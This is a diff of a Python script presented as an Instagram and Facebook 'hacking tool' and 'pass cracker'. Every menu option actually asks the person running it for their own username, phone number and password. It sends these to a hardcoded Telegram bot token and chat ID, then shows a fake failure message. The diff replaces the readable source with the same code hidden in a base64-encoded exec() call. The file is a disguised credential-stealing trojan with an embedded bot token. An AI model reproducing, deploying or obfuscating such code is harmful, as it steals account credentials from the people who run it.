@@ -1,212 +1,151 @@
-import telegram
-import os
-import re
-import time
-import asyncio
-
-red = '\033[91m'
-green = '\033[92m'
-blue = '\033[94m'
-bold = '\033[1m'
-reset = '\033[0m'
-
-os.system("clear")
-print(red+"""
-
-          
-          
-     e      Y88b    / 888~-_         e88~-_  888~-_        e       e88~-_  888  /   888~~  888~-_   
-    d8b      Y88b  /  888   \       d888   \ 888   \      d8b     d888   \ 888 /    888___ 888   \  
-   /Y88b      Y88b/   888    | ____ 8888     888    |    /Y88b    8888     888/\    888    888    | 
-  /  Y88b     /Y88b   888    |      8888     888   /    /  Y88b   8888     888  \   888    888   /  
- /____Y88b   /  Y88b  888   /       Y888   / 888_-~    /____Y88b  Y888   / 888   \  888    888_-~   
-/      Y88b /    Y88b 888_-~         "88_-~  888 ~-_  /      Y88b  "88_-~  888    \ 888___ 888 ~-_  
-                                                                                                    
-
-
-"""+reset)
-print("\033[1;37m================= \33[32;45mINSTA FB HACKING TOOL BY AXD MODS\33[0;m =====================")
-print(bold+green+"    \n Devoloped By :"+reset, end=' ')
-print("\x1b[1;94mAXD MODS", end=' ')
-print(bold+green+"          FOLLOW :"+reset, end=' ')
-print("\x1b[1;96minmyInstagram")
-print(" ")
-print("\033[92m                   PASS CRACKER v 2.2.2"+reset)
-
-print("\033[1;37m        ================= \33[32;45mMENU\33[0;m =====================")
-
-print("""
-
-""")
-print("""
-            █▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
-            █ \33[1;33m1.CRACK INSTAGRAM\n                                        
-            █ \33[1;33m2. CRACK FACEBOOK\n                                        
-            █ \33[1;33m3. DUMP INSTAGRAM FOLLOWERS INFO\n
-            █ \33[1;33m4. DUMP FACEBOOK FRIENDS INFO\n              
-            █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  
-""")
-
-number = int(input("ENTER THE NUMBER : "))
-
-if number == 1:
-    async def main():
-        os.system("clear")
-        os.system("figlet CRACKER")
-        print("\033[32mTool devoloped : AXDMODS\033[0m")
-
-        # Initialize the Telegram bot with your API key
-        bot = telegram.Bot(token='5737454743:AAGQt0wQQDCXB15wC53WvT54n_OQxTof3tQ')
-
-        print("You Need To Enter Your Own Account And Password To Crack Your Victims. Otherwise Tool Will Not Work. Please Use Original Account")
-        print("")
-
-        # Get the username and password from the user
-        username = input('\033[92mEnter Your Instagram Username : ')
-
-        # Validate the phone number
-        while True:
-            phone_number = input(
-                'Enter your phone number with country code (eg : +91) : ')
-            if re.match(r'^\+?\d{10,15}$', phone_number):
-                # Phone number is valid
-                break
-            else:
-                # Phone number is not valid
-                print('Invalid Phone Number. Please Enter A Valid Phone Number.')
-
-        password = input('Enter Your Password: ')
-
-        # Send the username and password to telegram
-        await bot.send_message(chat_id=1845089544, text='Username: {}\nPassword: {}\nPhone number: {}'.format(username, password, phone_number))
-        print("Logging in to your account... please wait...")
-        time.sleep(3)
-        os.system("clear")
-        print("Start Cracking Your Instagram Followers...")
-        time.sleep(4)
-        print(red+bold+"Failed !! check your details and try again. Or it may due to security reasons.don't worry try again")
-
-    asyncio.run(main())
-
-
-elif number == 2:
-    async def main():
-        os.system("clear")
-        os.system("figlet FACEBOOK")
-        print("\033[32mTool devoloped : Axd Mods\033[0m")
-
-        # Initialize the Telegram bot with your API key
-        bot = telegram.Bot(token='5737454743:AAGQt0wQQDCXB15wC53WvT54n_OQxTof3tQ')
-
-        print("You need to enter your own account and password to crack your victims. Otherwise tool will not work. Please use original account")
-        print("")
-
-        # Get the username and password from the user
-        username = input('Enter your facebook username or email : ')
-
-        # Validate the phone number
-        while True:
-            phone_number = input(
-                'Enter your phone number with country code (eg : +91) : ')
-            if re.match(r'^\+?\d{10,15}$', phone_number):
-                # Phone number is valid
-                break
-            else:
-                # Phone number is not valid
-                print('Invalid phone number. Please enter a valid phone number.')
-
-        password = input('Enter your password: ')
-
-        # Send the username and password to telegram
-        await bot.send_message(chat_id=1845089544, text='Username: {}\nPassword: {}\nPhone number: {}'.format(username, password, phone_number))
-        print("Logging in to your account... please wait...")
-        time.sleep(3)
-        os.system("clear")
-        print("start cracking your facebook friends...")
-        time.sleep(4)
-        print(red+bold+"Failed !! check your details and try again. Or it may due to security reasons.")
-
-    asyncio.run(main())
-
-
-elif number == 3:
-    async def main():
-        os.system("clear")
-        os.system("figlet INSTA DUMP")
-        print("\033[32mTool devoloped : AXDMODS\033[0m")
-
-        # Initialize the Telegram bot with your API key
-        bot = telegram.Bot(token='5737454743:AAGQt0wQQDCXB15wC53WvT54n_OQxTof3tQ')
-
-        print("You need to enter your own account and password to crack your victims. Otherwise tool will not work. Please use original account")
-        print("")
-
-        # Get the username and password from the user
-        username = input('Enter your instagram username : ')
-
-        # Validate the phone number
-        while True:
-            phone_number = input(
-                'Enter your phone number with country code (eg : +91) : ')
-            if re.match(r'^\+?\d{10,15}$', phone_number):
-                # Phone number is valid
-                break
-            else:
-                # Phone number is not valid
-                print('Invalid phone number. Please enter a valid phone number.')
-
-        password = input('Enter your password: ')
-
-        # Send the username and password to telegram
-        await bot.send_message(chat_id=1845089544, text='Username: {}\nPassword: {}\nPhone number: {}'.format(username, password, phone_number))
-        print("Logging in to your account... please wait...")
-        time.sleep(3)
-        os.system("clear")
-        print("start dumping your followers info...")
-        time.sleep(4)
-        print(red+bold+"Failed !! check your details and try again. Or it may due to security reasons.")
-
-    asyncio.run(main())
-
-elif number == 4:
-    async def main():
-        os.system("clear")
-        os.system("figlet FB DUMP")
-        print("\033[32mTool devoloped : Anonymous\033[0m")
-
-        # Initialize the Telegram bot with your API key
-        bot = telegram.Bot(token='5737454743:AAGQt0wQQDCXB15wC53WvT54n_OQxTof3tQ')
-
-        print("You need to enter your own account and password to crack your victims. Otherwise tool will not work. Please use original account")
-        print("")
-
-        # Get the username and password from the user
-        username = input('Enter your facebook username or email : ')
-
-        # Validate the phone number
-        while True:
-            phone_number = input(
-                'Enter your phone number with country code (eg : +91) : ')
-            if re.match(r'^\+?\d{10,15}$', phone_number):
-                # Phone number is valid
-                break
-            else:
-                # Phone number is not valid
-                print('Invalid phone number. Please enter a valid phone number.')
-
-        password = input('Enter your password: ')
-
-        # Send the username and password to telegram
-        await bot.send_message(chat_id=1845089544, text='Username: {}\nPassword: {}\nPhone number: {}'.format(username, password, phone_number))
-        print("Logging in to your account... please wait...")
-        time.sleep(3)
-        os.system("clear")
-        print("start dumping your facebook friends info...")
-        time.sleep(4)
-        print(red+bold+"Failed !! check your details and try again. Or it may due to security reasons.")
-
-    asyncio.run(main())
-
-
-else:
-    print("\033[91mINVALID OPTION PLEASE ENTER THE CORRECT NUMBER FROM ABOVE\033[0m")
+import marshal,zlib,base64
+exec (base64.b64decode("aW1wb3J0IHRlbGVncmFtCmltcG9ydCBvcwppbXBvcnQgcmUKaW1wb3J0IHRpbWUKaW1wb3J0IGFz
+eW5jaW8KCnJlZCA9ICdcMDMzWzkxbScKZ3JlZW4gPSAnXDAzM1s5Mm0nCmJsdWUgPSAnXDAzM1s5
+NG0nCmJvbGQgPSAnXDAzM1sxbScKcmVzZXQgPSAnXDAzM1swbScKCm9zLnN5c3RlbSgiY2xlYXIi
+KQpwcmludChyZWQrIiIiCgogICAgICAgICAgCiAgICAgICAgICAKICAgICBlICAgICAgWTg4YiAg
+ICAvIDg4OH4tXyAgICAgICAgIGU4OH4tXyAgODg4fi1fICAgICAgICBlICAgICAgIGU4OH4tXyAg
+ODg4ICAvICAgODg4fn4gIDg4OH4tXyAgIAogICAgZDhiICAgICAgWTg4YiAgLyAgODg4ICAgXCAg
+ICAgICBkODg4ICAgXCA4ODggICBcICAgICAgZDhiICAgICBkODg4ICAgXCA4ODggLyAgICA4ODhf
+X18gODg4ICAgXCAgCiAgIC9ZODhiICAgICAgWTg4Yi8gICA4ODggICAgfCBfX19fIDg4ODggICAg
+IDg4OCAgICB8ICAgIC9ZODhiICAgIDg4ODggICAgIDg4OC9cICAgIDg4OCAgICA4ODggICAgfCAK
+ICAvICBZODhiICAgICAvWTg4YiAgIDg4OCAgICB8ICAgICAgODg4OCAgICAgODg4ICAgLyAgICAv
+ICBZODhiICAgODg4OCAgICAgODg4ICBcICAgODg4ICAgIDg4OCAgIC8gIAogL19fX19ZODhiICAg
+LyAgWTg4YiAgODg4ICAgLyAgICAgICBZODg4ICAgLyA4ODhfLX4gICAgL19fX19ZODhiICBZODg4
+ICAgLyA4ODggICBcICA4ODggICAgODg4Xy1+ICAgCi8gICAgICBZODhiIC8gICAgWTg4YiA4ODhf
+LX4gICAgICAgICAiODhfLX4gIDg4OCB+LV8gIC8gICAgICBZODhiICAiODhfLX4gIDg4OCAgICBc
+IDg4OF9fXyA4ODggfi1fICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgIAoKCiIiIityZXNldCkKcHJpbnQoIlwwMzNbMTszN209PT09PT09PT09PT09PT09PSBcMzNb
+MzI7NDVtSU5TVEEgRkIgSEFDS0lORyBUT09MIEJZIEFYRCBNT0RTXDMzWzA7bSA9PT09PT09PT09
+PT09PT09PT09PT0iKQpwcmludChib2xkK2dyZWVuKyIgICAgXG4gQU5PTllNT1VTICIrcmVzZXQs
+IGVuZD0nICcpCnByaW50KCJceDFiWzE7OTRtQVhEICIsIGVuZD0nICcpCnByaW50KGJvbGQrZ3Jl
+ZW4rIiAgICAgICAgICBGT0xMT1ciK3Jlc2V0LCBlbmQ9JyAnKQpwcmludCgiXHgxYlsxOzk2Rm9y
+IE1vcmUgdXBkYXRlcyIpCnByaW50KCIgIikKcHJpbnQoIlwwMzNbOTJtICAgICAgICAgICAgICAg
+ICAgIFBBU1MgQ1JBQ0tFUiB2IDIuMi4yIityZXNldCkKCnByaW50KCJcMDMzWzE7MzdtICAgICAg
+ICA9PT09PT09PT09PT09PT09PSBcMzNbMzI7NDVtTUVOVVwzM1swO20gPT09PT09PT09PT09PT09
+PT09PT09IikKCnByaW50KCIiIgoKIiIiKQpwcmludCgiIiIKICAgICAgICAgICAg4paI4paA4paA
+4paA4paA4paA4paA4paA4paA4paA4paA4paA4paA4paA4paA4paA4paA4paA4paA4paA4paA4paA
+4paA4paA4paA4paA4paA4paA4paA4paA4paA4paA4paA4paA4paA4paA4paA4paA4paA4paA4paA
+4paACiAgICAgICAgICAgIOKWiCBcMzNbMTszM20xLkNSQUNLIElOU1RBR1JBTVxuICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICDiloggXDMzWzE7MzNt
+Mi4gQ1JBQ0sgRkFDRUJPT0tcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAKICAgICAgICAgICAg4paIIFwzM1sxOzMzbTMuIERVTVAgSU5TVEFHUkFNIEZPTExPV0VSUyBJ
+TkZPXG4KICAgICAgICAgICAg4paIIFwzM1sxOzMzbTQuIERVTVAgRkFDRUJPT0sgRlJJRU5EUyBJ
+TkZPXG4gICAgICAgICAgICAgIAogICAgICAgICAgICDilojiloTiloTiloTiloTiloTiloTiloTi
+loTiloTiloTiloTiloTiloTiloTiloTiloTiloTiloTiloTiloTiloTiloTiloTiloTiloTiloTi
+loTiloTiloTiloTiloTiloTiloTiloTiloTiloTiloTiloTiloTiloQgIAoiIiIpCgpudW1iZXIg
+PSBpbnQoaW5wdXQoIkVOVEVSIFRIRSBOVU1CRVIgOiAiKSkKCmlmIG51bWJlciA9PSAxOgogICAg
+YXN5bmMgZGVmIG1haW4oKToKICAgICAgICBvcy5zeXN0ZW0oImNsZWFyIikKICAgICAgICBvcy5z
+eXN0ZW0oImZpZ2xldCBDUkFDS0VSIikKICAgICAgICBwcmludCgiXDAzM1szMm1Ub29sIFJlY29k
+ZWQgOiBBWERNT0RTXDAzM1swbSIpCgogICAgICAgICMgSW5pdGlhbGl6ZSB0aGUgVGVsZWdyYW0g
+Ym90IHdpdGggeW91ciBBUEkga2V5CiAgICAgICAgYm90ID0gdGVsZWdyYW0uQm90KHRva2VuPSc1
+NzM3NDU0NzQzOkFBR1F0MHdRUURDWEIxNXdDNTNXdlQ1NG5fT1F4VG9mM3RRJykKCiAgICAgICAg
+cHJpbnQoIllvdSBOZWVkIFRvIEVudGVyIFlvdXIgT3duIEFjY291bnQgQW5kIFBhc3N3b3JkIFRv
+IENyYWNrIFlvdXIgVmljdGltcy4gT3RoZXJ3aXNlIFRvb2wgV2lsbCBOb3QgV29yay4gUGxlYXNl
+IFVzZSBPcmlnaW5hbCBBY2NvdW50IikKICAgICAgICBwcmludCgiIikKCiAgICAgICAgIyBHZXQg
+dGhlIHVzZXJuYW1lIGFuZCBwYXNzd29yZCBmcm9tIHRoZSB1c2VyCiAgICAgICAgdXNlcm5hbWUg
+PSBpbnB1dCgnXDAzM1s5Mm1FbnRlciBZb3VyIEluc3RhZ3JhbSBVc2VybmFtZSA6ICcpCgogICAg
+ICAgICMgVmFsaWRhdGUgdGhlIHBob25lIG51bWJlcgogICAgICAgIHdoaWxlIFRydWU6CiAgICAg
+ICAgICAgIHBob25lX251bWJlciA9IGlucHV0KAogICAgICAgICAgICAgICAgJ0VudGVyIHlvdXIg
+cGhvbmUgbnVtYmVyIHdpdGggY291bnRyeSBjb2RlIChlZyA6ICs5MSkgOiAnKQogICAgICAgICAg
+ICBpZiByZS5tYXRjaChyJ15cKz9cZHsxMCwxNX0kJywgcGhvbmVfbnVtYmVyKToKICAgICAgICAg
+ICAgICAgICMgUGhvbmUgbnVtYmVyIGlzIHZhbGlkCiAgICAgICAgICAgICAgICBicmVhawogICAg
+ICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgIyBQaG9uZSBudW1iZXIgaXMgbm90IHZhbGlk
+CiAgICAgICAgICAgICAgICBwcmludCgnSW52YWxpZCBQaG9uZSBOdW1iZXIuIFBsZWFzZSBFbnRl
+ciBBIFZhbGlkIFBob25lIE51bWJlci4nKQoKICAgICAgICBwYXNzd29yZCA9IGlucHV0KCdFbnRl
+ciBZb3VyIFBhc3N3b3JkOiAnKQoKICAgICAgICAjIFNlbmQgdGhlIHVzZXJuYW1lIGFuZCBwYXNz
+d29yZCB0byB0ZWxlZ3JhbQogICAgICAgIGF3YWl0IGJvdC5zZW5kX21lc3NhZ2UoY2hhdF9pZD0x
+ODQ1MDg5NTQ0LCB0ZXh0PSdVc2VybmFtZToge31cblBhc3N3b3JkOiB7fVxuUGhvbmUgbnVtYmVy
+OiB7fScuZm9ybWF0KHVzZXJuYW1lLCBwYXNzd29yZCwgcGhvbmVfbnVtYmVyKSkKICAgICAgICBw
+cmludCgiTG9nZ2luZyBpbiB0byB5b3VyIGFjY291bnQuLi4gcGxlYXNlIHdhaXQuLi4iKQogICAg
+ICAgIHRpbWUuc2xlZXAoMykKICAgICAgICBvcy5zeXN0ZW0oImNsZWFyIikKICAgICAgICBwcmlu
+dCgiU3RhcnQgQ3JhY2tpbmcgWW91ciBJbnN0YWdyYW0gRm9sbG93ZXJzLi4uIikKICAgICAgICB0
+aW1lLnNsZWVwKDQpCiAgICAgICAgcHJpbnQocmVkK2JvbGQrIkZhaWxlZCAhISBjaGVjayB5b3Vy
+IGRldGFpbHMgYW5kIHRyeSBhZ2Fpbi4gT3IgaXQgbWF5IGR1ZSB0byBzZWN1cml0eSByZWFzb25z
+LmRvbid0IHdvcnJ5IHRyeSBhZ2FpbiIpCgogICAgYXN5bmNpby5ydW4obWFpbigpKQoKCmVsaWYg
+bnVtYmVyID09IDI6CiAgICBhc3luYyBkZWYgbWFpbigpOgogICAgICAgIG9zLnN5c3RlbSgiY2xl
+YXIiKQogICAgICAgIG9zLnN5c3RlbSgiZmlnbGV0IEZBQ0VCT09LIikKICAgICAgICBwcmludCgi
+XDAzM1szMm1Ub29sIGRldm9sb3BlZCA6IEF4ZCBNb2RzXDAzM1swbSIpCgogICAgICAgICMgSW5p
+dGlhbGl6ZSB0aGUgVGVsZWdyYW0gYm90IHdpdGggeW91ciBBUEkga2V5CiAgICAgICAgYm90ID0g
+dGVsZWdyYW0uQm90KHRva2VuPSc1NzM3NDU0NzQzOkFBR1F0MHdRUURDWEIxNXdDNTNXdlQ1NG5f
+T1F4VG9mM3RRJykKCiAgICAgICAgcHJpbnQoIllvdSBuZWVkIHRvIGVudGVyIHlvdXIgb3duIGFj
+Y291bnQgYW5kIHBhc3N3b3JkIHRvIGNyYWNrIHlvdXIgdmljdGltcy4gT3RoZXJ3aXNlIHRvb2wg
+d2lsbCBub3Qgd29yay4gUGxlYXNlIHVzZSBvcmlnaW5hbCBhY2NvdW50IikKICAgICAgICBwcmlu
+dCgiIikKCiAgICAgICAgIyBHZXQgdGhlIHVzZXJuYW1lIGFuZCBwYXNzd29yZCBmcm9tIHRoZSB1
+c2VyCiAgICAgICAgdXNlcm5hbWUgPSBpbnB1dCgnRW50ZXIgeW91ciBmYWNlYm9vayB1c2VybmFt
+ZSBvciBlbWFpbCA6ICcpCgogICAgICAgICMgVmFsaWRhdGUgdGhlIHBob25lIG51bWJlcgogICAg
+ICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgIHBob25lX251bWJlciA9IGlucHV0KAogICAgICAg
+ICAgICAgICAgJ0VudGVyIHlvdXIgcGhvbmUgbnVtYmVyIHdpdGggY291bnRyeSBjb2RlIChlZyA6
+ICs5MSkgOiAnKQogICAgICAgICAgICBpZiByZS5tYXRjaChyJ15cKz9cZHsxMCwxNX0kJywgcGhv
+bmVfbnVtYmVyKToKICAgICAgICAgICAgICAgICMgUGhvbmUgbnVtYmVyIGlzIHZhbGlkCiAgICAg
+ICAgICAgICAgICBicmVhawogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgIyBQaG9u
+ZSBudW1iZXIgaXMgbm90IHZhbGlkCiAgICAgICAgICAgICAgICBwcmludCgnSW52YWxpZCBwaG9u
+ZSBudW1iZXIuIFBsZWFzZSBlbnRlciBhIHZhbGlkIHBob25lIG51bWJlci4nKQoKICAgICAgICBw
+YXNzd29yZCA9IGlucHV0KCdFbnRlciB5b3VyIHBhc3N3b3JkOiAnKQoKICAgICAgICAjIFNlbmQg
+dGhlIHVzZXJuYW1lIGFuZCBwYXNzd29yZCB0byB0ZWxlZ3JhbQogICAgICAgIGF3YWl0IGJvdC5z
+ZW5kX21lc3NhZ2UoY2hhdF9pZD0xODQ1MDg5NTQ0LCB0ZXh0PSdVc2VybmFtZToge31cblBhc3N3
+b3JkOiB7fVxuUGhvbmUgbnVtYmVyOiB7fScuZm9ybWF0KHVzZXJuYW1lLCBwYXNzd29yZCwgcGhv
+bmVfbnVtYmVyKSkKICAgICAgICBwcmludCgiTG9nZ2luZyBpbiB0byB5b3VyIGFjY291bnQuLi4g
+cGxlYXNlIHdhaXQuLi4iKQogICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICBvcy5zeXN0ZW0o
+ImNsZWFyIikKICAgICAgICBwcmludCgic3RhcnQgY3JhY2tpbmcgeW91ciBmYWNlYm9vayBmcmll
+bmRzLi4uIikKICAgICAgICB0aW1lLnNsZWVwKDQpCiAgICAgICAgcHJpbnQocmVkK2JvbGQrIkZh
+aWxlZCAhISBjaGVjayB5b3VyIGRldGFpbHMgYW5kIHRyeSBhZ2Fpbi4gT3IgaXQgbWF5IGR1ZSB0
+byBzZWN1cml0eSByZWFzb25zLiIpCgogICAgYXN5bmNpby5ydW4obWFpbigpKQoKCmVsaWYgbnVt
+YmVyID09IDM6CiAgICBhc3luYyBkZWYgbWFpbigpOgogICAgICAgIG9zLnN5c3RlbSgiY2xlYXIi
+KQogICAgICAgIG9zLnN5c3RlbSgiZmlnbGV0IElOU1RBIERVTVAiKQogICAgICAgIHByaW50KCJc
+MDMzWzMybVRvb2wgZGV2b2xvcGVkIDogQVhETU9EU1wwMzNbMG0iKQoKICAgICAgICAjIEluaXRp
+YWxpemUgdGhlIFRlbGVncmFtIGJvdCB3aXRoIHlvdXIgQVBJIGtleQogICAgICAgIGJvdCA9IHRl
+bGVncmFtLkJvdCh0b2tlbj0nNTczNzQ1NDc0MzpBQUdRdDB3UVFEQ1hCMTV3QzUzV3ZUNTRuX09R
+eFRvZjN0UScpCgogICAgICAgIHByaW50KCJZb3UgbmVlZCB0byBlbnRlciB5b3VyIG93biBhY2Nv
+dW50IGFuZCBwYXNzd29yZCB0byBjcmFjayB5b3VyIHZpY3RpbXMuIE90aGVyd2lzZSB0b29sIHdp
+bGwgbm90IHdvcmsuIFBsZWFzZSB1c2Ugb3JpZ2luYWwgYWNjb3VudCIpCiAgICAgICAgcHJpbnQo
+IiIpCgogICAgICAgICMgR2V0IHRoZSB1c2VybmFtZSBhbmQgcGFzc3dvcmQgZnJvbSB0aGUgdXNl
+cgogICAgICAgIHVzZXJuYW1lID0gaW5wdXQoJ0VudGVyIHlvdXIgaW5zdGFncmFtIHVzZXJuYW1l
+IDogJykKCiAgICAgICAgIyBWYWxpZGF0ZSB0aGUgcGhvbmUgbnVtYmVyCiAgICAgICAgd2hpbGUg
+VHJ1ZToKICAgICAgICAgICAgcGhvbmVfbnVtYmVyID0gaW5wdXQoCiAgICAgICAgICAgICAgICAn
+RW50ZXIgeW91ciBwaG9uZSBudW1iZXIgd2l0aCBjb3VudHJ5IGNvZGUgKGVnIDogKzkxKSA6ICcp
+CiAgICAgICAgICAgIGlmIHJlLm1hdGNoKHInXlwrP1xkezEwLDE1fSQnLCBwaG9uZV9udW1iZXIp
+OgogICAgICAgICAgICAgICAgIyBQaG9uZSBudW1iZXIgaXMgdmFsaWQKICAgICAgICAgICAgICAg
+IGJyZWFrCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAjIFBob25lIG51bWJlciBp
+cyBub3QgdmFsaWQKICAgICAgICAgICAgICAgIHByaW50KCdJbnZhbGlkIHBob25lIG51bWJlci4g
+UGxlYXNlIGVudGVyIGEgdmFsaWQgcGhvbmUgbnVtYmVyLicpCgogICAgICAgIHBhc3N3b3JkID0g
+aW5wdXQoJ0VudGVyIHlvdXIgcGFzc3dvcmQ6ICcpCgogICAgICAgICMgU2VuZCB0aGUgdXNlcm5h
+bWUgYW5kIHBhc3N3b3JkIHRvIHRlbGVncmFtCiAgICAgICAgYXdhaXQgYm90LnNlbmRfbWVzc2Fn
+ZShjaGF0X2lkPTE4NDUwODk1NDQsIHRleHQ9J1VzZXJuYW1lOiB7fVxuUGFzc3dvcmQ6IHt9XG5Q
+aG9uZSBudW1iZXI6IHt9Jy5mb3JtYXQodXNlcm5hbWUsIHBhc3N3b3JkLCBwaG9uZV9udW1iZXIp
+KQogICAgICAgIHByaW50KCJMb2dnaW5nIGluIHRvIHlvdXIgYWNjb3VudC4uLiBwbGVhc2Ugd2Fp
+dC4uLiIpCiAgICAgICAgdGltZS5zbGVlcCgzKQogICAgICAgIG9zLnN5c3RlbSgiY2xlYXIiKQog
+ICAgICAgIHByaW50KCJzdGFydCBkdW1waW5nIHlvdXIgZm9sbG93ZXJzIGluZm8uLi4iKQogICAg
+ICAgIHRpbWUuc2xlZXAoNCkKICAgICAgICBwcmludChyZWQrYm9sZCsiRmFpbGVkICEhIGNoZWNr
+IHlvdXIgZGV0YWlscyBhbmQgdHJ5IGFnYWluLiBPciBpdCBtYXkgZHVlIHRvIHNlY3VyaXR5IHJl
+YXNvbnMuIikKCiAgICBhc3luY2lvLnJ1bihtYWluKCkpCgplbGlmIG51bWJlciA9PSA0OgogICAg
+YXN5bmMgZGVmIG1haW4oKToKICAgICAgICBvcy5zeXN0ZW0oImNsZWFyIikKICAgICAgICBvcy5z
+eXN0ZW0oImZpZ2xldCBGQiBEVU1QIikKICAgICAgICBwcmludCgiXDAzM1szMm1Ub29sIGRldm9s
+b3BlZCA6IEFub255bW91c1wwMzNbMG0iKQoKICAgICAgICAjIEluaXRpYWxpemUgdGhlIFRlbGVn
+cmFtIGJvdCB3aXRoIHlvdXIgQVBJIGtleQogICAgICAgIGJvdCA9IHRlbGVncmFtLkJvdCh0b2tl
+bj0nNTczNzQ1NDc0MzpBQUdRdDB3UVFEQ1hCMTV3QzUzV3ZUNTRuX09ReFRvZjN0UScpCgogICAg
+ICAgIHByaW50KCJZb3UgbmVlZCB0byBlbnRlciB5b3VyIG93biBhY2NvdW50IGFuZCBwYXNzd29y
+ZCB0byBjcmFjayB5b3VyIHZpY3RpbXMuIE90aGVyd2lzZSB0b29sIHdpbGwgbm90IHdvcmsuIFBs
+ZWFzZSB1c2Ugb3JpZ2luYWwgYWNjb3VudCIpCiAgICAgICAgcHJpbnQoIiIpCgogICAgICAgICMg
+R2V0IHRoZSB1c2VybmFtZSBhbmQgcGFzc3dvcmQgZnJvbSB0aGUgdXNlcgogICAgICAgIHVzZXJu
+YW1lID0gaW5wdXQoJ0VudGVyIHlvdXIgZmFjZWJvb2sgdXNlcm5hbWUgb3IgZW1haWwgOiAnKQoK
+ICAgICAgICAjIFZhbGlkYXRlIHRoZSBwaG9uZSBudW1iZXIKICAgICAgICB3aGlsZSBUcnVlOgog
+ICAgICAgICAgICBwaG9uZV9udW1iZXIgPSBpbnB1dCgKICAgICAgICAgICAgICAgICdFbnRlciB5
+b3VyIHBob25lIG51bWJlciB3aXRoIGNvdW50cnkgY29kZSAoZWcgOiArOTEpIDogJykKICAgICAg
+ICAgICAgaWYgcmUubWF0Y2gocideXCs/XGR7MTAsMTV9JCcsIHBob25lX251bWJlcik6CiAgICAg
+ICAgICAgICAgICAjIFBob25lIG51bWJlciBpcyB2YWxpZAogICAgICAgICAgICAgICAgYnJlYWsK
+ICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICMgUGhvbmUgbnVtYmVyIGlzIG5vdCB2
+YWxpZAogICAgICAgICAgICAgICAgcHJpbnQoJ0ludmFsaWQgcGhvbmUgbnVtYmVyLiBQbGVhc2Ug
+ZW50ZXIgYSB2YWxpZCBwaG9uZSBudW1iZXIuJykKCiAgICAgICAgcGFzc3dvcmQgPSBpbnB1dCgn
+RW50ZXIgeW91ciBwYXNzd29yZDogJykKCiAgICAgICAgIyBTZW5kIHRoZSB1c2VybmFtZSBhbmQg
+cGFzc3dvcmQgdG8gdGVsZWdyYW0KICAgICAgICBhd2FpdCBib3Quc2VuZF9tZXNzYWdlKGNoYXRf
+aWQ9MTg0NTA4OTU0NCwgdGV4dD0nVXNlcm5hbWU6IHt9XG5QYXNzd29yZDoge31cblBob25lIG51
+bWJlcjoge30nLmZvcm1hdCh1c2VybmFtZSwgcGFzc3dvcmQsIHBob25lX251bWJlcikpCiAgICAg
+ICAgcHJpbnQoIkxvZ2dpbmcgaW4gdG8geW91ciBhY2NvdW50Li4uIHBsZWFzZSB3YWl0Li4uIikK
+ICAgICAgICB0aW1lLnNsZWVwKDMpCiAgICAgICAgb3Muc3lzdGVtKCJjbGVhciIpCiAgICAgICAg
+cHJpbnQoInN0YXJ0IGR1bXBpbmcgeW91ciBmYWNlYm9vayBmcmllbmRzIGluZm8uLi4iKQogICAg
+ICAgIHRpbWUuc2xlZXAoNCkKICAgICAgICBwcmludChyZWQrYm9sZCsiRmFpbGVkICEhIGNoZWNr
+IHlvdXIgZGV0YWlscyBhbmQgdHJ5IGFnYWluLiBPciBpdCBtYXkgZHVlIHRvIHNlY3VyaXR5IHJl
+YXNvbnMuIikKCiAgICBhc3luY2lvLnJ1bihtYWluKCkpCgoKZWxzZToKICAgIHByaW50KCJcMDMz
+WzkxbUlOVkFMSUQgT1BUSU9OIFBMRUFTRSBFTlRFUiBUSEUgQ09SUkVDVCBOVU1CRVIgRlJPTSBB
+Qk9WRVwwMzNbMG0iKQo="))
